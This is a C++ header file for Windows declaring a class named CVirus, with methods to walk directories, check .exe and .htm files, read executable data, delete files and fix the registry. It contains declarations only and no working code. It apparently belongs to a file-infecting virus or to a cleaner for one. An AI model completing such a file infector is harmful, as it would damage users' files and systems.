#pragma once
#include <iostream>
#include <Windows.h>
#include <shlwapi.h>
#pragma comment(lib,"shlwapi.lib")

class CVirus
{
public:
	CVirus();
	~CVirus();
	BOOL HeapAlloc(LPVOID* save, SIZE_T size, BOOL isZERO);
	BOOL HeapFree(LPVOID* Address);
	void EnumFile(LPCSTR DirPath, DWORD Deep);
	void FileProc(LPCSTR DirPath, WIN32_FIND_DATAA& Info);
	BOOL CheckExe(LPCSTR DirPath, WIN32_FIND_DATAA& Info);
	BOOL CheckHtm(LPCSTR DirPath, WIN32_FIND_DATAA& Info);
	BOOL FixRegedit();
protected:
	BOOL DeleFile(LPCSTR Path);
	BOOL GetExeInfo(LPBYTE MemAdd, DWORD& dwSize, LPSTR Name);
private:
	HANDLE	mHeap;
	LPVOID	mVirus;
	LPVOID	mpLast;
	LPCH	mbuff;
	DWORD	mLastSize;
};

